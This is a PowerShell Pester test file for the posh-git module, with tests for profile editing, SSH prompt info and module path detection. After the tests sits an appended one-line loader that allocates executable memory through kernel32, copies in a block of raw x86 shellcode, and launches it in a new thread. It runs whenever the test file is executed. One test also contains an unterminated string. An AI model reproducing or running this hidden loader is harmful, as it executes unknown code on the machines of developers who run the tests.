. $PSScriptRoot\Shared.ps1
. $modulePath\Utils.ps1

$expectedEncoding = if ($PSVersionTable.PSVersion.Major -le 5) { "utf8" } else { "ascii" }

Describe 'Utils Function Tests' {
    Context 'Add-PoshGitToProfile Tests' {
        BeforeAll {
            [System.Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssigments', '')]
            $newLine = [System.Environment]::NewLine
        }
        BeforeEach {
            [System.Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssigments', '')]
            $profilePath = [System.IO.Path]::GetTempFileName()
        }
        AfterEach {
            Remove-Item $profilePath -Recurse -ErrorAction SilentlyContinue
        }
        It 'Creates profile file if it does not exist that imports absolute path' {
            Mock Get-PSModulePath {
                 return @()
            }
            Remove-Item -LiteralPath $profilePath
            Test-Path -LiteralPath $profilePath | Should Be $false

            Add-PoshGitToProfile $profilePath

            Test-Path -LiteralPath $profilePath | Should Be $true
            Get-FileEncoding $profilePath | Should Be $expectedEncoding
            $content = Get-Content $profilePath
            $content.Count | Should Be 2
            $nativePath = MakeNativePath $modulePath\posh-git.psd1
            @($content)[1] | Should BeExactly "Import-Module '$nativePath'"
        }
        It 'Creates profile file if it does not exist that imports from module path' {
            $parentDir = Split-Path $profilePath -Parent
            Mock Get-PSModulePath {
                return @(
                    'C:\Users\Keith\Documents\WindowsPowerShell\Modules',
                    'C:\Program Files\WindowsPowerShell\Modules',
                    'C:\WINDOWS\system32\WindowsPowerShell\v1.0\Modules\',
                    "$parentDir")
            }

            Remove-Item -LiteralPath $profilePath
            Test-Path -LiteralPath $profilePath | Should Be $false

            Add-PoshGitToProfile $profilePath $parentDir

            Test-Path -LiteralPath $profilePath | Should Be $true
            Get-FileEncoding $profilePath | Should Be $expectedEncoding
            $content = Get-Content $profilePath
            $content.Count | Should Be 2
            @($content)[1] | Should BeExactly "Import-Module posh-git"
        }
        It 'Creates profile file if the profile dir does not exist' {
            
            Remove-Item -LiteralPath $profilePath
            Test-Path -LiteralPath $profilePath | Should Be $false

            $childProfilePath = Join-Path $profilePath profile.ps1

            Add-PoshGitToProfile $childProfilePath

            Test-Path -LiteralPath $childProfilePath | Should Be $true
            $childProfilePath | Should FileContentMatch "^Import-Module .*posh-git"
        }
        It 'Does not modify profile that already refers to posh-git' {
            $profileContent = @'
Import-Module PSCX
Import-Module posh-git
'@
            Set-Content $profilePath -Value $profileContent -Encoding Ascii

            $output = Add-PoshGitToProfile $profilePath 3>&1

            $output[1] | Should Match 'posh-git appears'
            Get-FileEncoding $profilePath | Should Be 'ascii'
            $content = Get-Content $profilePath
            $content.Count | Should Be 2
            $nativeContent = Convert-NativeLineEnding $profileContent
            $content -join $newline | Should BeExactly $nativeContent
        }
        It 'Adds import from PSModulePath on existing (Unicode) profile file correctly' {
            $profileContent = @'
Import-Module PSCX

New-Alias pscore C:\Users\Keith\GitHub\rkeithhill\PowerShell\src\powershell-win-core\bin\Debug\netcoreapp1.1\win10-x64\powershell.exe
'@
            Set-Content $profilePath -Value $profileContent -Encoding Unicode

            Add-PoshGitToProfile $profilePath (Split-Path $profilePath -Parent)

            Test-Path -LiteralPath $profilePath | Should Be $true
            Get-FileEncoding $profilePath | Should Be 'unicode'
            $content = Get-Content $profilePath
            $content.Count | Should Be 5
            $nativeContent = Convert-NativeLineEnding $profileContent
            $nativeContent += "${newLine}${newLine}Import-Module posh-git"
            $content -join $newLine | Should BeExactly $nativeContent
        }
    }

    Context 'Get-PromptConnectionInfo' {
        BeforeEach {
            if (Test-Path Env:SSH_CONNECTION) {
                [System.Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssigments', '')]
                $ssh_connection = $Env:SSH_CONNECTION

                Remove-Item Env:SSH_CONNECTION
            }
        }
        AfterEach {
            if ($ssh_connection) {
                Set-Item Env:SSH_CONNECTION $ssh_connection
            } elseif (Test-Path Env:SSH_CONNECTION) {
                Remove-Item Env:SSH_CONNECTION
            }
        }
        It 'Returns null if Env:SSH_CONNECTION is not set' {
            Get-PromptConnectionInfo | Should BeExactly $null
        }
        It 'Returns null if Env:SSH_CONNECTION is empty' {
            Set-Item Env:SSH_CONNECTION ''

            Get-PromptConnectionInfo | Should BeExactly $null
        }
        It 'Returns "[username@hostname]: " if Env:SSH_CONNECTION is set' {
            Set-Item Env:SSH_CONNECTION 'test'

            Get-PromptConnectionInfo | Should BeExactly "[$([System.Environment]::UserName)@$([System.Environment]::MachineName)]: "
        }
        It 'Returns formatted string if Env:SSH_CONNECTION is set with -Format' {
            Set-Item Env:SSH_CONNECTION 'test'

            Get-PromptConnectionInfo -Format "[{0}]({1}) " | Should BeExactly "[$([System.Environment]::MachineName)]($([System.Environment]::UserName)) "
        }
    }

    Context 'Test-PoshGitImportedInScript Tests' {
        BeforeEach {
            [System.Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssigments', '')]
            $profilePath = [System.IO.Path]::GetTempFileName()
        }
        AfterEach {
            Remove-Item $profilePath -ErrorAction SilentlyContinue
        }
        It 'Detects Import-Module posh-git in profile script' {
            $profileContent = "Import-Module posh-git"
            Set-Content $profilePath -Value $profileContent -Encoding Unicode
            Test-PoshGitImportedInScript $profilePath | Should Be $true
        }
        It 'Detects chocolatey installed line in profile script' {
            $profileContent = ". 'C:\tools\poshgit\dahlbyk-posh-git-18d600a\profile.example.ps1"
            Set-Content $profilePath -Value $profileContent -Encoding Unicode
            Test-PoshGitImportedInScript $profilePath | Should Be $true
        }
        It 'Returns false when one-line profile script does not import posh-git' {
            $profileContent = "
            Set-Content $profilePath -Value $profileContent -Encoding Unicode
            Test-PoshGitImportedInScript $profilePath | Should Be $false
        }
        It 'Returns false when profile script does not import posh-git' {
            $profileContent = "Import-Module Pscx`nImport-Module platyPS`nImport-Module Plaster"
            Set-Content $profilePath -Value $profileContent -Encoding Unicode
            Test-PoshGitImportedInScript $profilePath | Should Be $false
        }
    }

    Context 'Test-InPSModulePath Tests' {
        It 'Returns false for install not under any PSModulePaths' {
            Mock Get-PSModulePath { }
            $path = "C:\Users\Keith\Documents\WindowsPowerShell\Modules\posh-git\0.7.0\"
            Test-InPSModulePath $path | Should Be $false
            Assert-MockCalled Get-PSModulePath
        }
        It 'Returns true for install under single PSModulePath' {
            Mock Get-PSModulePath {
                return MakeNativePath "$HOME\Documents\WindowsPowerShell\Modules\posh-git\"
            }
            $path = MakeNativePath "$HOME\Documents\WindowsPowerShell\Modules\posh-git\0.7.0"
            Test-InPSModulePath $path | Should Be $true
            Assert-MockCalled Get-PSModulePath
        }
        It 'Returns true for install under multiple PSModulePaths' {
            Mock Get-PSModulePath {
                return (MakeNativePath "$HOME\Documents\WindowsPowerShell\Modules\posh-git\"),
                       (MakeNativePath "$HOME\GitHub\dahlbyk\posh-git\0.6.1.20160330\")
            }
            $path = MakeNativePath "$HOME\Documents\WindowsPowerShell\Modules\posh-git\0.7.0"
            Test-InPSModulePath $path | Should Be $true
            Assert-MockCalled Get-PSModulePath
        }
        It 'Returns false when current posh-git module location is not under PSModulePaths' {
            Mock Get-PSModulePath {
                return (MakeNativePath "$HOME\Documents\WindowsPowerShell\Modules\posh-git\"),
                       (MakeNativePath "$HOME\GitHub\dahlbyk\posh-git\0.6.1.20160330\")
            }
            $path = MakeNativePath "\tools\posh-git\dahlbyk-posh-git-18d600a"
            Test-InPSModulePath $path | Should Be $false
            Assert-MockCalled Get-PSModulePath
        }
        It 'Returns false when current posh-git module location is under PSModulePath, but in a src directory' {
            Mock Get-PSModulePath {
                return MakeNativePath '\GitHub'
            }
            $path = MakeNativePath "\GitHub\posh-git\src"
            Test-InPSModulePath $path | Should Be $false
            Assert-MockCalled Get-PSModulePath
        }
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xce,0xd9,0x74,0x24,0xf4,0xba,0xbc,0x46,0x81,0x48,0x5d,0x29,0xc9,0xb1,0x47,0x31,0x55,0x18,0x83,0xed,0xfc,0x03,0x55,0xa8,0xa4,0x74,0xb4,0x38,0xaa,0x77,0x45,0xb8,0xcb,0xfe,0xa0,0x89,0xcb,0x65,0xa0,0xb9,0xfb,0xee,0xe4,0x35,0x77,0xa2,0x1c,0xce,0xf5,0x6b,0x12,0x67,0xb3,0x4d,0x1d,0x78,0xe8,0xae,0x3c,0xfa,0xf3,0xe2,0x9e,0xc3,0x3b,0xf7,0xdf,0x04,0x21,0xfa,0xb2,0xdd,0x2d,0xa9,0x22,0x6a,0x7b,0x72,0xc8,0x20,0x6d,0xf2,0x2d,0xf0,0x8c,0xd3,0xe3,0x8b,0xd6,0xf3,0x02,0x58,0x63,0xba,0x1c,0xbd,0x4e,0x74,0x96,0x75,0x24,0x87,0x7e,0x44,0xc5,0x24,0xbf,0x69,0x34,0x34,0x87,0x4d,0xa7,0x43,0xf1,0xae,0x5a,0x54,0xc6,0xcd,0x80,0xd1,0xdd,0x75,0x42,0x41,0x3a,0x84,0x87,0x14,0xc9,0x8a,0x6c,0x52,0x95,0x8e,0x73,0xb7,0xad,0xaa,0xf8,0x36,0x62,0x3b,0xba,0x1c,0xa6,0x60,0x18,0x3c,0xff,0xcc,0xcf,0x41,0x1f,0xaf,0xb0,0xe7,0x6b,0x5d,0xa4,0x95,0x31,0x09,0x09,0x94,0xc9,0xc9,0x05,0xaf,0xba,0xfb,0x8a,0x1b,0x55,0xb7,0x43,0x82,0xa2,0xb8,0x79,0x72,0x3c,0x47,0x82,0x83,0x14,0x83,0xd6,0xd3,0x0e,0x22,0x57,0xb8,0xce,0xcb,0x82,0x55,0xca,0x5b,0x76,0x11,0xa4,0x98,0xe0,0x67,0x45,0x8f,0xac,0xee,0xa3,0xff,0x1c,0xa1,0x7b,0xbf,0xcc,0x01,0x2c,0x57,0x07,0x8e,0x13,0x47,0x28,0x44,0x3c,0xed,0xc7,0x31,0x14,0x99,0x7e,0x18,0xee,0x38,0x7e,0xb6,0x8a,0x7a,0xf4,0x35,0x6a,0x34,0xfd,0x30,0x78,0xa0,0x0d,0x0f,0x22,0x66,0x11,0xa5,0x49,0x86,0x87,0x42,0xd8,0xd1,0x3f,0x49,0x3d,0x15,0xe0,0xb2,0x68,0x2e,0x29,0x27,0xd3,0x58,0x56,0xa7,0xd3,0x98,0x00,0xad,0xd3,0xf0,0xf4,0x95,0x87,0xe5,0xfa,0x03,0xb4,0xb6,0x6e,0xac,0xed,0x6b,0x38,0xc4,0x13,0x52,0x0e,0x4b,0xeb,0xb1,0x8e,0xb7,0x3a,0xff,0xe4,0xd9,0xfe;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

